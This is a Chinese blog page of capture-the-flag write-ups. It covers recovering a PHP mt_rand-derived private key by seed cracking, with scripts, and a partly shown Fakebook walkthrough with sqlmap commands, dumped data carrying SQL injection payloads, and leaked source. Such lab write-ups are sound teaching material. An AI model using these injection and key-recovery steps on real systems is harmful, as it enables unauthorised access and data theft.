@@ -1,0 +1,517 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUUCTF(四) | wanan</title><meta name="keywords" content="CTF,BUUCTF"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[MRCTF2020]Ezaudit&lt;?phpheader(&amp;#x27;Content-type:text&#x2F;html; charset&#x3D;utf-8&amp;#x27;);error_reporting(0);if(isset($_POST[&amp;#x27;login&amp;#x27;]))&amp;#123;    $username &#x3D; $_POST[&amp;#x27;username&amp;#x27;];    $passw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF(四)">
+<meta property="og:url" content="https://www.wanan.red/444854351.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="[MRCTF2020]Ezaudit&lt;?phpheader(&amp;#x27;Content-type:text&#x2F;html; charset&#x3D;utf-8&amp;#x27;);error_reporting(0);if(isset($_POST[&amp;#x27;login&amp;#x27;]))&amp;#123;    $username &#x3D; $_POST[&amp;#x27;username&amp;#x27;];    $passw">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg">
+<meta property="article:published_time" content="2022-10-18T15:01:57.643Z">
+<meta property="article:modified_time" content="2022-11-25T09:18:38.363Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/444854351"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-e6YD56vlMd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?882501b6f459073168e4d14d5e29d5e2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-FYB0HL88QE');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BUUCTF(四)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-25 17:18:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">74</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">60</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">57</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF(四)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-18T15:01:57.643Z" title="发表于 2022-10-18 23:01:57">2022-10-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-25T09:18:38.363Z" title="更新于 2022-11-25 17:18:38">2022-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUUCTF(四)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并2秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )<span class="comment">#13个#</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;<span class="comment">#12个#</span></span><br><span class="line">            <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">            <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>密码直接万能密码绕过,题目给了公钥,可以根据公钥,反推出私钥</p>
+<p>伪随机数php_mt_rand() .伪随机数会根据种子(seed)和调用次数(i)生成伪随机数,常用的是mt_rand(min,max)函数,首先将公钥转换为工具可以识别的字符串</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf php_mt_seed-4.0.tar.gz</span><br><span class="line">cd php_mt_seed-4.0 </span><br><span class="line">chmod +x php_mt_seed.c</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make time ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220426225734644.png" alt="image-20220426225734644"></p>
+<p>先把php版本降下来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1775196155</span>);<span class="comment">//种子</span></span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">public_key</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">private_key</span>();</span><br><span class="line"><span class="comment">//必须需要先执行一次，然后才能得到正确的私钥</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#结果  公钥和私钥的结果根据次数不同而不同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="comment">#XuNhoueCDCGc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220426230134693.png" alt="image-20220426230134693"></p>
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>打开网页有login 与join界面login弱口令登录试试,登录使用sqlmap跑一下看有无注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt --level 4  --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>查看一下源码,在扫描一下目录</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101038987.png" alt="image-20220310103853926"></p>
+<p>发现这些挨个访问看看在robots.txt页面发现有</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>
+
+<p>上面的文件虽然存在但是却无法访问到,有可能是因为权限不够,需要找系统中访问的其他方式</p>
+<p>接下来下载下来user.php.bak得到源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;    </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)    </span>&#123;     </span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;      </span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;        </span><br><span class="line"><span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;    &#125;   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)    </span>&#123;        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">//初始化一个url回话        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的url        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置url参数,要求结果保存到字符串还是输出到屏幕    </span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//运行curl,请求网页     </span></span><br><span class="line"><span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="comment">//获取一个curl连接资源句柄的信息      </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;        </span><br><span class="line"><span class="keyword">return</span> <span class="number">404</span>;        &#125;        </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">//关闭一个curl会话     </span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$output</span>;    &#125;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)    </span>&#123;     </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable language_">$this</span>-&gt;blog);    &#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)    </span>&#123;    </span><br><span class="line"><span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;      </span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问 view.php发现报错信息,得到绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/view.php </span><br></pre></td></tr></table></figure>
+
+<p>这里对join 注册页面进行抓包使用sqlmap抓包看看有无注入发现有一个注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -dbs --batch	//这里得到数据库名</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] fakebook</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook --tables --batch   //这里得到表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook -T users --dump --batch	//这里得到字段</span><br><span class="line">-----------------------------------------------------------------+</span><br><span class="line">| no   | data | passwd    | username                                                 ---------------------------------------------+</span><br><span class="line">| 1    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin   |</span><br><span class="line">| 2    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:100:&quot;admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB&quot;;s:3:&quot;age&quot;;i:4;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB |</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注册完成登录进去之后会发现只有一个username可以点击可以发现其在访问页面,在url中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1</span><br></pre></td></tr></table></figure>
+
+<p>尝试一下sql注入发现报错信息</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101042353.png" alt="image-20220310104235297"></p>
